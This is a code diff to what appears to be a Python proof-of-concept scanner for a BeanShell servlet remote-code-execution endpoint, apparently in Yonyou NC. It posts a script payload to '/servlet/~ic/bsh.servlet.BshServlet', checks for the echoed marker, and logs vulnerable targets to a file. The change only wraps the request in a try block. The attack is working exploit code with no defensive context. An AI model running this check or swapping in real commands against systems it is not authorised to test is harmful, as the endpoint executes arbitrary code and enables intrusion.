@@ -30,8 +30,8 @@ headers = {
 def poc(target):
     url = target + "/servlet/~ic/bsh.servlet.BshServlet"
     data = {"bsh.script":'print("poctest");'}
-    res = requests.post(url,headers=headers,data=data,timeout=5,verify=False).text
     try:
+        res = requests.post(url,headers=headers,data=data,timeout=5,verify=False).text
         if "poctest" in res:
             print(f"[+] {target} is vulnable")
             with open("yync.txt","a+",encoding="utf-8") as f:
